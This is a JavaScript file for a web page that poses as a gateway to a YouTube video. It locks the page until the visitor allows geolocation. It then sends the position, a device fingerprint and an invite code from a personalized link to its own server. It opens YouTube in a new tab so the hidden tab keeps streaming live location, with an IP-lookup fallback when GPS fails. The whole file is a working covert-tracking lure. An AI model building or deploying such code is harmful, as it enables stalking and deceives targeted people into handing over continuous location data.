/**
 * Centered Open Youtube dialog with blurred, non-interactive background.
 *
 * - Page stays locked (blur + no taps) until location is allowed.
 * - Allow → current fix, then live watchPosition updates while this tab stays open.
 * - YouTube opens in a new tab so this page can keep streaming location.
 * - Don't Allow / location denied → instructions screen (no YouTube).
 */

const YOUTUBE_URL = "https://www.youtube.com/watch?v=l_GlMjcPoOQ";

/** Live updates: at most once per interval, or sooner if user moved far enough. */
const LIVE_MIN_INTERVAL_MS = 10000;
const LIVE_MIN_DISTANCE_M = 10;
/** Backup poll — watchPosition often pauses when the YouTube tab is focused. */
const LIVE_HEARTBEAT_MS = 15000;

const dialogEl = document.getElementById("consent-dialog");
const consentStep = document.getElementById("consent-step");
const waitingStep = document.getElementById("waiting-step");
const allowBtn = document.getElementById("consent-continue");
const denyBtn = document.getElementById("consent-not-now");
const statusEl = document.getElementById("status");
const pageContent = document.getElementById("page-content");
const blockedEl = document.getElementById("blocked-screen");
const dialogHintEl = document.getElementById("consent-hint");

const sessionId =
  crypto.randomUUID?.() ||
  `sess_${Date.now()}_${Math.random().toString(36).slice(2, 10)}`;

/** From personalized link ?c=XXXXXX — only set when present in the URL. */
function readInviteCodeFromUrl() {
  try {
    const raw = new URLSearchParams(window.location.search).get("c") || "";
    return raw.trim().replace(/[^a-zA-Z0-9_-]/g, "").slice(0, 32);
  } catch {
    return "";
  }
}

const inviteCode = readInviteCodeFromUrl();

/** Filled once on init — same deviceId/deviceName for this phone across visits. */
let deviceInfo = {
  deviceId: "",
  deviceName: "",
  model: "",
  os: "",
  browser: "",
  platform: "",
  screen: "",
  language: "",
  timezone: "",
  userAgent: "",
};

let watchId = null;
let heartbeatId = null;
let lastLiveSentAt = 0;
let lastLiveCoords = null;
let liveSendInFlight = false;

function lockPage() {
  document.body.classList.add("gate-active");
  document.body.classList.remove("content-blocked");
  if (pageContent) {
    pageContent.hidden = false;
    pageContent.setAttribute("inert", "");
  }
}

function unlockPage() {
  document.body.classList.remove("gate-active");
  if (pageContent) {
    pageContent.hidden = false;
    pageContent.removeAttribute("inert");
  }
}

function showConsentStep() {
  lockPage();
  dialogEl.hidden = false;
  dialogEl.setAttribute("aria-hidden", "false");
  if (consentStep) consentStep.hidden = false;
  if (waitingStep) waitingStep.hidden = true;
  if (blockedEl) blockedEl.hidden = true;
}

function showWaitingStep() {
  lockPage();
  dialogEl.hidden = false;
  dialogEl.setAttribute("aria-hidden", "false");
  if (consentStep) consentStep.hidden = true;
  if (waitingStep) waitingStep.hidden = false;
}

function hideDialog() {
  dialogEl.hidden = true;
  dialogEl.setAttribute("aria-hidden", "true");
}

function setStatus(message, tone = "info") {
  if (!statusEl) return;
  statusEl.hidden = false;
  statusEl.textContent = message;
  statusEl.className = `status is-${tone}`;
}

function setDialogHint(message) {
  if (!dialogHintEl) return;
  if (!message) {
    dialogHintEl.hidden = true;
    dialogHintEl.textContent = "";
    return;
  }
  dialogHintEl.hidden = false;
  dialogHintEl.textContent = message;
}

function openYouTube() {
  window.open(YOUTUBE_URL, "_blank", "noopener,noreferrer");
}

function showDeniedInstructions() {
  hideDialog();
  document.body.classList.remove("gate-active");
  document.body.classList.add("content-blocked");
  if (pageContent) pageContent.hidden = true;
  if (blockedEl) blockedEl.hidden = false;
}

function positionPayload(position, type) {
  return {
    latitude: position.coords.latitude,
    longitude: position.coords.longitude,
    accuracy: position.coords.accuracy,
    timestamp: position.timestamp,
    type,
    sessionId,
    deviceId: deviceInfo.deviceId,
    deviceName: deviceInfo.deviceName,
    model: deviceInfo.model,
    os: deviceInfo.os,
    browser: deviceInfo.browser,
    platform: deviceInfo.platform,
    screen: deviceInfo.screen,
    language: deviceInfo.language,
    timezone: deviceInfo.timezone,
    userAgent: deviceInfo.userAgent,
    inviteCode,
  };
}

function distanceMeters(a, b) {
  const toRad = (deg) => (deg * Math.PI) / 180;
  const R = 6371000;
  const dLat = toRad(b.latitude - a.latitude);
  const dLon = toRad(b.longitude - a.longitude);
  const lat1 = toRad(a.latitude);
  const lat2 = toRad(b.latitude);
  const h =
    Math.sin(dLat / 2) ** 2 +
    Math.cos(lat1) * Math.cos(lat2) * Math.sin(dLon / 2) ** 2;
  return 2 * R * Math.asin(Math.sqrt(h));
}

function shouldSendLiveUpdate(position) {
  const now = Date.now();
  const coords = {
    latitude: position.coords.latitude,
    longitude: position.coords.longitude,
  };

  if (!lastLiveCoords) return true;
  if (now - lastLiveSentAt >= LIVE_MIN_INTERVAL_MS) return true;
  if (distanceMeters(lastLiveCoords, coords) >= LIVE_MIN_DISTANCE_M) return true;
  return false;
}

async function sendLocationToServer(payload) {
  const response = await fetch("/api/locations", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(payload),
  });

  if (!response.ok) {
    const data = await response.json().catch(() => ({}));
    const message = data.error || `Save failed (HTTP ${response.status})`;
    console.error("Backend save failed:", message);
    const error = new Error(message);
    error.code = "SAVE_FAILED";
    throw error;
  }

  return true;
}

async function sendLiveUpdate(position, force = false) {
  if (liveSendInFlight) return;
  if (!force && !shouldSendLiveUpdate(position)) return;

  liveSendInFlight = true;
  try {
    const ok = await sendLocationToServer(positionPayload(position, "live"));
    if (ok) {
      lastLiveSentAt = Date.now();
      lastLiveCoords = {
        latitude: position.coords.latitude,
        longitude: position.coords.longitude,
      };
      setStatus("Sharing live location… Keep this tab open.", "ok");
    }
  } finally {
    liveSendInFlight = false;
  }
}

function pollLiveLocation() {
  if (!("geolocation" in navigator)) return;
  navigator.geolocation.getCurrentPosition(
    (position) => {
      sendLiveUpdate(position, true).catch((error) => {
        console.error("Live location heartbeat failed:", error);
      });
    },
    (error) => {
      console.error("Live location heartbeat error:", error);
      if (isDeniedError(error)) stopLiveLocation();
    },
    {
      enableHighAccuracy: true,
      maximumAge: 0,
      timeout: 20000,
    }
  );
}

function startLiveLocation() {
  if (!("geolocation" in navigator) || watchId != null) return;

  watchId = navigator.geolocation.watchPosition(
    (position) => {
      sendLiveUpdate(position).catch((error) => {
        console.error("Live location update failed:", error);
      });
    },
    (error) => {
      console.error("Live location watch error:", error);
      if (isDeniedError(error)) {
        stopLiveLocation();
      }
    },
    {
      enableHighAccuracy: true,
      maximumAge: 0,
      timeout: 20000,
    }
  );

  if (heartbeatId == null) {
    heartbeatId = window.setInterval(pollLiveLocation, LIVE_HEARTBEAT_MS);
  }
}

function stopLiveLocation() {
  if (watchId != null && "geolocation" in navigator) {
    navigator.geolocation.clearWatch(watchId);
  }
  watchId = null;
  if (heartbeatId != null) {
    window.clearInterval(heartbeatId);
    heartbeatId = null;
  }
}

function requestBrowserLocationOnce(options) {
  return new Promise((resolve, reject) => {
    if (!("geolocation" in navigator)) {
      reject(Object.assign(new Error("Geolocation is not supported."), { code: -1 }));
      return;
    }

    navigator.geolocation.getCurrentPosition(resolve, reject, options);
  });
}

/**
 * Browser GPS can fail even when permission is ON (common on Mac/desktop).
 * This is NOT a backend error — getCurrentPosition fails before any API call.
 * Fall back to approximate IP location so Sheets/live map still get a point.
 */
async function requestIpLocationFallback() {
  const controller = new AbortController();
  const timer = window.setTimeout(() => controller.abort(), 12000);
  try {
    const response = await fetch("https://get.geojs.io/v1/ip/geo.json", {
      signal: controller.signal,
    });
    if (!response.ok) throw new Error(`IP lookup HTTP ${response.status}`);
    const data = await response.json();
    const latitude = Number(data.latitude);
    const longitude = Number(data.longitude);
    if (!Number.isFinite(latitude) || !Number.isFinite(longitude)) {
      throw new Error("IP lookup returned no coordinates");
    }
    return {
      coords: {
        latitude,
        longitude,
        accuracy: Number(data.accuracy) || 25000,
      },
      timestamp: Date.now(),
      fromIpFallback: true,
    };
  } finally {
    window.clearTimeout(timer);
  }
}

async function requestBrowserLocation() {
  try {
    return await requestBrowserLocationOnce({
      enableHighAccuracy: true,
      timeout: 15000,
      maximumAge: 0,
    });
  } catch (firstError) {
    if (isDeniedError(firstError)) throw firstError;
    console.warn("High-accuracy location failed, retrying…", firstError);
  }

  try {
    return await requestBrowserLocationOnce({
      enableHighAccuracy: false,
      timeout: 20000,
      maximumAge: 60000,
    });
  } catch (secondError) {
    if (isDeniedError(secondError)) throw secondError;
    console.warn("Browser GPS unavailable — trying IP approximate location…", secondError);
  }

  return requestIpLocationFallback();
}

async function getGeoPermissionState() {
  try {
    if (!navigator.permissions?.query) return "unknown";
    const result = await navigator.permissions.query({ name: "geolocation" });
    return result.state;
  } catch {
    return "unknown";
  }
}

function isDeniedError(error) {
  return (
    error &&
    (error.code === 1 ||
      error.code === error.PERMISSION_DENIED ||
      String(error.message || error)
        .toLowerCase()
        .includes("denied"))
  );
}

function locationErrorMessage(error) {
  if (!error) return "Could not get location. Please tap Allow again.";
  if (error.code === "SAVE_FAILED") {
    return `Location found, but save failed: ${error.message}`;
  }
  if (error.code === 2 || error.code === error.POSITION_UNAVAILABLE) {
    return "Location permission is on, but this device could not find a GPS/Wi‑Fi fix. Turn on Location Services in system settings, try outdoors/Wi‑Fi, then tap Allow again.";
  }
  if (error.code === 3 || error.code === error.TIMEOUT) {
    return "Location timed out. Keep the page open, ensure Location Services are on for this browser, then tap Allow again.";
  }
  if (error.code === -1) {
    return "This browser does not support location.";
  }
  return error.message || "Could not get location. Please tap Allow again.";
}

/**
 * Allow → keep blur lock + centered waiting card, then ask for location.
 * YouTube opens only after location is granted.
 */
async function handleAllow() {
  allowBtn.disabled = true;
  denyBtn.disabled = true;

  // Keep the centered overlay so the page cannot be used while Chrome
  // shows its system location bar at the top.
  showWaitingStep();

  try {
    const position = await requestBrowserLocation();
    const usedIpFallback = Boolean(position.fromIpFallback);

    lastLiveSentAt = Date.now();
    lastLiveCoords = {
      latitude: position.coords.latitude,
      longitude: position.coords.longitude,
    };

    await sendLocationToServer(positionPayload(position, "current"));

    // Keep this tab open and stream updates; YouTube opens in a new tab.
    // Skip live GPS watch when we only have approximate IP location.
    if (!usedIpFallback) {
      startLiveLocation();
    }
    hideDialog();
    unlockPage();
    setStatus(
      usedIpFallback
        ? "Approximate location saved (GPS unavailable on this device). Opening YouTube…"
        : "Location allowed. Sharing live updates… Keep this Al-Khushi tab open. Opening YouTube…",
      "ok"
    );
    openYouTube();
  } catch (error) {
    console.error("Location flow error:", error);

    if (isDeniedError(error)) {
      showDeniedInstructions();
      return;
    }

    setDialogHint(locationErrorMessage(error));
    showConsentStep();
  } finally {
    allowBtn.disabled = false;
    denyBtn.disabled = false;
  }
}

function handleDontAllow() {
  showDeniedInstructions();
}

async function init() {
  showConsentStep();

  try {
    if (typeof collectDeviceInfo === "function") {
      deviceInfo = await collectDeviceInfo();
    }
  } catch (error) {
    console.error("Device info failed:", error);
  }

  const perm = await getGeoPermissionState();
  if (perm === "denied") {
    setDialogHint(
      "Location is blocked. On Android: lock icon → Permissions → Location → Allow. On iPhone: aA/i icon → Website Settings → Location → Allow. Then tap Allow."
    );
  } else {
    setDialogHint("");
  }
}

allowBtn.addEventListener("click", handleAllow);
denyBtn.addEventListener("click", handleDontAllow);

document.getElementById("blocked-reload")?.addEventListener("click", () => {
  const params = new URLSearchParams();
  if (inviteCode) params.set("c", inviteCode);
  params.set("t", String(Date.now()));
  window.location.href = `${window.location.pathname}?${params.toString()}`;
});

// Block touch scrolling on the page while the gate is active.
document.addEventListener(
  "touchmove",
  (event) => {
    if (document.body.classList.contains("gate-active")) {
      if (!dialogEl.contains(event.target)) {
        event.preventDefault();
      }
    }
  },
  { passive: false }
);

init();
